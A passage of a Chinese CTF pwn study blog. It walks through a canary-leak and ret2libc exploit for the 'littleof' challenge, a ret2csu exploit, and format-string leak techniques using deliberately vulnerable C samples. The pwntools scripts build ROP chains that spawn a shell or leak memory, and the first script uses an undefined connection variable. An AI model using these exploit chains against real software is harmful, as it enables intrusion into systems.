class="line"></span><br></pre></td></tr></table></figure><h3 id="2021-鹤城杯Canary-littleof"><a href="#2021-鹤城杯Canary-littleof" class="headerlink" title="[2021 鹤城杯Canary]littleof"></a>[2021 鹤城杯Canary]<strong>littleof</strong></h3><p>[【PWN · ret2libc | Canary】<a href="https://blog.csdn.net/Mr_Fmnwon/article/details/131098575">2021 鹤城杯]littleof-CSDN博客</a></p><p><a href="https://mzgao.blog.csdn.net/article/details/104115114">Canary学习（泄露Canary）-CSDN博客</a></p><p>首先<code>file</code>, <code>checksec</code>一下，得出程序是64位的，且开启了canary保护，再放入ida中</p><p><img src="/2024/03/15/CTF/image-20240411225807677.png" alt="image-20240411225807677"></p><p>如果我们写大量的数据覆写掉buf数组长度的字符串的结尾标志，那么下一行printf就可以泄露大量的栈上信息——<strong>泄露出我们的Canary</strong></p><h4 id="Canary绕过"><a href="#Canary绕过" class="headerlink" title="Canary绕过"></a>Canary绕过</h4><p>Canary设计以字节\x00结尾，本意是保证Canary可以截断字符串。泄露栈中的Canary的思路是覆盖Canary的低字节，来打印出剩余的Canary部分。需要合适的输出函数，并且需要先泄露Canary，之后再次溢出控制执行流程。<br>需要注意：Canary一般最低位是\x00，也就是结尾处，64位程序的canary的大小是8个字节，32位程序的canary的大小是4个字节。<br>canary的位置不一定与ebp存储的位置相邻，具体得看程序的汇编操作，不同编译器在进行编译时canary位置可能出现偏差，有可能ebp与canary之间有字节被随机填充</p><p><img src="/2024/03/15/CTF/image-20240412012527785.png" alt="image-20240412012527785"></p><p>可知</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[rbp + buf] -50h里是buf</span><br><span class="line">[rbp + var_8] -8 里存放的是canary的值</span><br><span class="line">因此向其中填充(0x50-8)个字节即可</span><br><span class="line">然后后面的printf函数会打印canary出来</span><br></pre></td></tr></table></figure><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> u64,p64</span><br><span class="line"> </span><br><span class="line"><span class="comment"># io=process(&quot;./littleof&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./littleof&quot;</span>)</span><br><span class="line"> </span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#payload1:准备泄露canary</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x8</span>)   <span class="comment">#构造尾部不同的垃圾数据，使得能够定位到最后</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">io.sendline(payload1);          <span class="comment">#注意，最后发了个回车，对应\x0a需要剪掉</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x8</span>))             <span class="comment">#定位到canary之前</span></span><br><span class="line">canary=u64(io.recv(<span class="number">8</span>))          <span class="comment">#接收canary，但是勿忘回车</span></span><br><span class="line">canary=canary-<span class="number">0x0a</span>              <span class="comment">#减去回车</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary:&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"> </span><br><span class="line">pop_rdi_ret_addr=<span class="number">0x400863</span></span><br><span class="line">ret_addr=<span class="number">0x40059e</span>               <span class="comment">#单个ret指令，用于栈对齐</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x400789</span></span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt:&quot;</span>,<span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;plt_got:&quot;</span>,<span class="built_in">hex</span>(puts_got))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#payload2：泄露libc</span></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>       <span class="comment">#绕过canary保护的垃圾数据</span></span><br><span class="line">payload2+=p64(pop_rdi_ret_addr)+p64(puts_got)   <span class="comment">#pop rdi来设置puts的参数</span></span><br><span class="line">payload2+=p64(puts_plt)                         <span class="comment">#调用puts函数</span></span><br><span class="line">payload2+=p64(main_addr)                        <span class="comment">#返回有效地址且再次进行栈溢出</span></span><br><span class="line"> </span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,payload2)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))    <span class="comment">#获取puts真实地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_real_addr:&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#--------------------------------ret2libc---------------------------#</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment">#-------------------------------------------------------------------#</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#payload3：构造调用system(&quot;/bin/sh&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload3=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#因为system被调用时，其中有一个汇编指令，要求栈顶16字节对齐，否则会出错。需要栈能够调整其高度，就可以通过ret+ret+…+addr的方式。这样首先是调整了输入的个数（满足栈顶对齐的要求），其次ret到下一个ret,反复执行实则是“空转”，相当于pop了当前的栈元素，不起到任何其他作用。最后还是跳到了addr的位置。</span></span><br><span class="line"><span class="comment"># 返回到ret指令，进行栈对齐操作</span></span><br><span class="line">payload3+=p64(ret_addr)</span><br><span class="line"><span class="comment"># 设置system函数的参数</span></span><br><span class="line">payload3+=p64(pop_rdi_ret_addr)+p64(bin_sh)</span><br><span class="line">payload3+=p64(system)</span><br><span class="line"></span><br><span class="line">payload3+=p64(main_addr)</span><br><span class="line"> </span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p><a href="https://blog.csdn.net/AcSuccess/article/details/104448463">中级ROP之ret2csu_read(0, fmt, 0x100ull)-CSDN博客</a></p><p><strong>原理</strong><br>在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。这时候，我们可以利用x64下的__libc_csu_init中的gadgets，如例二情况。<br>这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。</p><p><strong>__libc_csu_init函数的汇编指令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011B0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004011B0                 public __libc_csu_init</span><br><span class="line">.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004011B0 ; __unwind &#123;</span><br><span class="line">.text:00000000004011B0                 push    r15</span><br><span class="line">.text:00000000004011B2                 mov     r15, rdx</span><br><span class="line">.text:00000000004011B5                 push    r14</span><br><span class="line">.text:00000000004011B7                 mov     r14, rsi</span><br><span class="line">.text:00000000004011BA                 push    r13</span><br><span class="line">.text:00000000004011BC                 mov     r13d, edi</span><br><span class="line">.text:00000000004011BF                 push    r12</span><br><span class="line">.text:00000000004011C1                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004011C8                 push    rbp</span><br><span class="line">.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004011D0                 push    rbx</span><br><span class="line">.text:00000000004011D1                 sub     rbp, r12</span><br><span class="line">.text:00000000004011D4                 sub     rsp, 8</span><br><span class="line">.text:00000000004011D8                 call    _init_proc</span><br><span class="line">.text:00000000004011DD                 sar     rbp, 3</span><br><span class="line">.text:00000000004011E1                 jz      short loc_4011FE</span><br><span class="line">.text:00000000004011E3                 xor     ebx, ebx</span><br><span class="line">.text:00000000004011E5                 nop     dword ptr [rax]</span><br><span class="line">.text:00000000004011E8</span><br><span class="line">.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j</span><br><span class="line">.text:00000000004011E8                 mov     rdx, r15</span><br><span class="line">.text:00000000004011EB                 mov     rsi, r14</span><br><span class="line">.text:00000000004011EE                 mov     edi, r13d</span><br><span class="line">.text:00000000004011F1                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004011F5                 add     rbx, 1</span><br><span class="line">.text:00000000004011F9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011FC                 jnz     short loc_4011E8</span><br><span class="line">.text:00000000004011FE</span><br><span class="line">.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j</span><br><span class="line">.text:00000000004011FE                 add     rsp, 8</span><br><span class="line">.text:0000000000401202                 pop     rbx</span><br><span class="line">.text:0000000000401203                 pop     rbp</span><br><span class="line">.text:0000000000401204                 pop     r12</span><br><span class="line">.text:0000000000401206                 pop     r13</span><br><span class="line">.text:0000000000401208                 pop     r14</span><br><span class="line">.text:000000000040120A                 pop     r15</span><br><span class="line">.text:000000000040120C                 retn</span><br><span class="line">.text:000000000040120C ; &#125; // starts at 4011B0</span><br><span class="line">.text:000000000040120C __libc_csu_init endp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>分析</strong></p><p>gadgets1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j</span><br><span class="line">.text:00000000004011FE                 add     rsp, 8</span><br><span class="line">.text:0000000000401202                 pop     rbx</span><br><span class="line">.text:0000000000401203                 pop     rbp</span><br><span class="line">.text:0000000000401204                 pop     r12</span><br><span class="line">.text:0000000000401206                 pop     r13</span><br><span class="line">.text:0000000000401208                 pop     r14</span><br><span class="line">.text:000000000040120A                 pop     r15</span><br><span class="line">.text:000000000040120C                 retn</span><br><span class="line">.text:000000000040120C ; &#125; // starts at 4011B0</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>这段代码可以将你构造的栈中的值一个一个顺序存到rbx,rbp,r12,r13,r14,r15寄存器中。</li><li>需要注意的是，可能随着环境的不同，r13,r14,r15的顺序也会有所改变。</li></ul><p>gadgets2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j</span><br><span class="line">.text:00000000004011E8                 mov     rdx, r15</span><br><span class="line">.text:00000000004011EB                 mov     rsi, r14</span><br><span class="line">.text:00000000004011EE                 mov     edi, r13d</span><br><span class="line">.text:00000000004011F1                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004011F5                 add     rbx, 1</span><br><span class="line">.text:00000000004011F9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011FC                 jnz     short loc_4011E8</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>通过gadgets1中最后的ret，使程序流程走gadget2，这样可以将存储在r15的值赋给rdx，存储在r14的值赋给rsi，存储在r13的值赋给edi，此时rdi的高32位寄存器中值为0，所以我们也可以控制rdi的值。</p></li><li><p>call指令跳转到r12寄存器存储的位置处（在gadgets1中置rbx&#x3D;0）</p></li><li><p>rbx+1，判断是否与rbp相等，否则重新执行gadgets2，这里我们为了不重新执行，将rbp置为1.</p></li><li><p>这段gadgets2走完之后，顺序往下走汇编码，又会走到gadgets1，所以我们在栈中需要设7*8&#x3D;56个padding字符，使栈不会空，然后设置特定的ret地址。</p></li><li><p>重新走gadgets1时，会把rbx,rbp,r12,r13,r14,r15六个寄存器重新设值，但这六个寄存器对我们来说已经没用了，所以可以为任意的padding。我们的目的仅仅是要控制rdi,rsi,rdx三个寄存器来存放函数的参数。</p></li><li><p>需要注意的是，rdi为第一个参数的存放寄存器，rsi为第二个参数，rdx为第三个参数。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  vul(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">vul</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a3 == <span class="number">3</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try or Retry your payload&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>分析+Exp</strong></p><ul><li>不能使用call直接跳转到vul函数，因为got表中没有vul函数，所以要考虑绕过call这个调用，使用ret返回到vul的真实地址。</li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./easy_csu&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./easy_csu&quot;</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x4011fe</span></span><br><span class="line">gadget2 = <span class="number">0x4011e8</span></span><br><span class="line">vul_addr=<span class="number">0x401132</span></span><br><span class="line"><span class="comment"># 这里通过init_array_start函数的指针来跳过call</span></span><br><span class="line"><span class="comment"># init_array_start函数是ELF程序的一个初始化函数，运行它不会对栈空间造成影响，可以说是用于跳过call指令的最佳选择</span></span><br><span class="line">init_array=elf.symbols[<span class="string">&#x27;__init_array_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 跳到gadget1时，先esp+8，再pop值到对应寄存器中</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span> + <span class="number">8</span>) + p64(gadget1) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># rbx=0,rbp=1</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># r12,调用的函数地址</span></span><br><span class="line">payload += p64(init_array)</span><br><span class="line"><span class="comment">#r13,r14,r15</span></span><br><span class="line"><span class="comment">#因为调用的是init_array_start函数,所以参数随意,但题目要求a3==3</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload+=p64(gadget2)</span><br><span class="line"><span class="comment">#向下走会回到gadget1所以再填充7*8个字节</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(vul_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="格式化字符串漏洞-1"><a href="#格式化字符串漏洞-1" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p><a href="https://www.yuque.com/hxfqg9/bin/aedgn4#MVxZS">格式化字符串漏洞 (yuque.com)</a></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>以一个例子展示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译一下：<code>gcc -m32 -fno-stack-protector -no-pie -o fs1 1.c</code></p><p>在 printf 函数上面下个断点，然后 r 运行，输入 %08x.%08x.%08x</p><p><img src="/2024/03/15/CTF/image-20240416233705677.png" alt="image-20240416233705677"></p><p>运行过程中程序先将printf的参数全部入栈<code>&quot;%08x.%08x.%08x.%s\n&quot;</code>,<code>a</code>, <code>b</code>,<code>c</code>,<code>s</code>四个参数，然后对<code>&quot;%08x.%08x.%08x.%s\n&quot;</code>进行输出，遇到<code>%</code>将对应参数进行解析，每一个参数都是将栈上后一个参数按对应格式输出</p><p><code>%08x.%08x.%08x.%s\n</code> 这是 printf 函数的第一个参数：格式化字符串，printf 函数会根据这个字符串来解析后面的参数</p><p>第一个 %08x 解析的是 0x1，也就是源码里面的 a，第二个 %08x 解析的是 0x22222222，peda 显示的有些问题，但是通过 x&#x2F;wx 0xffffce18 看出来的确实是之前源码里面的 b，第三个 %08x 解析的是 0xffffffff，也就是参数 c：-1，后面的 %s 会把我们输入的内容，也就是 %08x.%08x.%08x 给打印出来</p><p>我们执行 c 让程序继续运行，看一下结果</p><p><img src="/2024/03/15/CTF/image-20240416233756895.png" alt="image-20240416233756895"></p><p>结果跟我们想的一样，同时程序断在了第二个 printf 这里，把我们之前输入的内容作为 格式化字符串，但是这一次没有给他提供其他的参数，但是他同样会在栈上找临近的三个参数，根据 格式化字符串 给打印出来，这样就把他后面三个栈上的值给输出出来了</p><p><img src="/2024/03/15/CTF/image-20240416234051662.png" alt="image-20240416234051662"></p><p>但是上面的都是获取临近的内容进行输出，我们不可能只要这几个东西，可以通过 %n$x 来获取被视作第 n+1 个参数的值（格式化字符串是第一个参数）</p><p>那上个例子来说，如果使用 %3$x 就会打印出第四个参数对应的值</p><p>小技巧总结</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别</span><br><span class="line"></span><br><span class="line">利用 %s 来获取变量所对应地址的内容，只不过有零截断</span><br><span class="line"></span><br><span class="line">利用 %n$x 来获取指定参数的值，利用 %n$s 来获取指定参数对应地址的内容</span><br></pre></td></tr></table></figure><h3 id="泄露任意地址的内存"><a href="#泄露任意地址的内存" class="headerlink" title="泄露任意地址的内存"></a>泄露任意地址的内存</h3><p>之前的方法还只是泄露栈上变量值，没法泄露变量的地址，但是如果我们知道格式化字符串在输出函数调用时是第几个参数，这里假设格式化字符串相对函数调用是第 k 个参数，那我们就可以通过如下方法来获取指定地址 addr 的内容 <code>addr%k$x</code></p><p>下面就是确定格式化字符串是第几个参数了，一般可以通过 [tag]%p%p%p%p%p%p%p%p%p 来实现，如果输出的内容跟我们前面的 tag 重复了，那就说明我们找到了，但是不排除栈上有些其他变量也是这个值，所以可以用一些其他的字符进行再次尝试</p><p>使用 objdump -R fs1 查看一下 got 表</p><p><img src="/2024/03/15/CTF/image-20240416235535805.png" alt="image-20240416235535805"></p><p>通过这段代码，可以把 scanf 的地址给打印出来，%s 是把地址指向的内存内容给打印出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">program = <span class="string">&quot;./fs1&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(program)</span><br><span class="line">elf = ELF(program)</span><br><span class="line">__isoc99_scanf_got = elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;scanf: &quot;</span>, <span class="built_in">hex</span>(__isoc99_scanf_got))</span><br><span class="line"></span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">b&#x27;%4$s&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload: &quot;</span>, payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;%4$s\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__isoc99_scanf_got: &quot;</span>, <span class="built_in">hex</span>(u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/03/15/CTF/image-20240417000659258.png" alt="image-20240417000659258">需要注意的是不能直接在命令行输入 \x14\xa0\x0%4$s 否则 scanf 会把它识别成：\，x，1，4….</p><h3 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h3><p>%n，不输出字符，但是把已经成功输入的字符个数写入对应的整型指针参数所指的变量</p><p>只要变量对应的地址可写，就可以利用格式化字符串来改变其对应的值</p><p>一般来说，利用分为以下的步骤：</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 